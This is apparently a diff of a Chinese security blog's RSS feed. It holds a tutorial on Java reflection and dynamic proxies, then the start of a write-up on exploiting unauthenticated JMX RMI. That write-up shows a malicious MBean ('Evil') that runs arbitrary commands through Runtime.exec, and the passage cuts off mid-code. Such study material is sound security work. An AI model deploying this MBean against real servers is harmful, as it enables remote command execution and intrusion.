+                &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;NoSuchFieldException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ClassNotFoundException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;IllegalAccessException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;InstantiationException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;PRtest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Rtest&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;PRtest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;publicfunc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;privatefunc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;secret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;还有其它一些方法，比如获取构造器的等等。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x03-类方法调用&quot;&gt;0x03 类方法调用&lt;/h2&gt;
+&lt;p&gt;类方法调用其实跟类成员变量的操作差不多，用到的是 Method 类中的 invoke() 方法，也会有访问权限的问题，但是同样可以通过 setAccessible() 方法来解决。&lt;/p&gt;
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;Method&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;privatefunc&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;0x04-动态代理&quot;&gt;0x04 动态代理&lt;/h2&gt;
+&lt;p&gt;提供一个代理对象，用代理对象来取代对原对象的访问，这里原对象的类需要时实现接口的类。也有可以实现对不需要实现接口的类的对象的代理，但是需要引入别的库了。&lt;/p&gt;
+
+&lt;h4 id=&quot;动态代理实现&quot;&gt;动态代理实现&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;实现调用处理器 InvocationHandler 接口&lt;/li&gt;
+  &lt;li&gt;用 newProxyInstance 来获取一个代理对象
+public static Object newProxyInstance(ClassLoader loader, Class&amp;lt;?&amp;gt;[] interfaces, InvocationHandler h)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;newProxyInstance 这个方法中需要用到的类加载器，和接口参数都是可以通过反射来获得的，写的例子：
+InterfaceTest.java&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;interface&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;InterfaceTest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;InvocationhandlerTest.java&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.lang.reflect.InvocationHandler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.lang.reflect.Method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/**
+ * Created by k1n9 on 2017/9/12.
+ */&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;InvocationhandlerTest&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;InvocationHandler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;InvocationhandlerTest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proxy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Method&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Throwable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;ProxyTest.java&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.lang.reflect.InvocationHandler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.lang.reflect.Proxy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/**
+ * Created by k1n9 on 2017/9/12.
+ */&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ProxyTest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;Ptest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Ptest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;InvocationHandler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;InvocationhandlerTest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;nc&quot;&gt;InterfaceTest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proxyobj&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;InterfaceTest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Proxy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newProxyInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInterfaces&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;proxyobj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Ptest&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;InterfaceTest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;action called!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;代理对象对方法的调用都是通过调用处理器中的 invoke 方法来调用的，Ysoerial 中的一些 payload 的触发也用到了这一点。&lt;/p&gt;
+</description>
+        <pubDate>Tue, 12 Sep 2017 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2017/09/12/java-reflection-and-dynamic-proxy.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2017/09/12/java-reflection-and-dynamic-proxy.html</guid>
+        
+        <category>Java</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>JMX RMI攻击利用</title>
+        <description>&lt;h2 id=&quot;0x00-简述&quot;&gt;0x00 简述&lt;/h2&gt;
+&lt;p&gt;好几年前就有人提到这个关于JMX RMI的攻击了，个人觉得这个只是因为没有做到安全配置而导致存在的可被攻击利用的点。攻击者可以远程注册一个恶意的 MBean，再去调用里面的用于执行命令的方法达到攻击效果。代码来自参考文章，只对代码做了少许改动，他还为 metasploit 写了这个攻击模块，具体的可以看参考链接。主要还是去了解其中的攻击利用实现，用到的也都是正常功能了。&lt;/p&gt;
+
+&lt;p&gt;前提条件:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;允许远程访问，没有开启认证 (com.sun.management.jmxremote.authenticate=false)&lt;/li&gt;
+  &lt;li&gt;能够远程注册 MBean (javax.management.loading.MLet)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;0x01-恶意mbean&quot;&gt;0x01 恶意MBean&lt;/h2&gt;
+&lt;p&gt;EvilMBean.java:&lt;/p&gt;
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/**
+ * 定义MBean接口和用来执行命令的方法
+ */&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;interface&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;EvilMBean&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;runCommand&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Evil.java:&lt;/p&gt;
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.BufferedReader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.InputStreamReader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/**
+ * 类名要与实现的接口的前缀一样
+ */&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Evil&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;EvilMBean&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;runCommand&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;Runtime&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;Process&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;BufferedReader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdInput&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BufferedReader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;InputStreamReader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()));&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;BufferedReader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdError&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BufferedReader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;InputStreamReader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getErrorStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()));&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdout_err_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
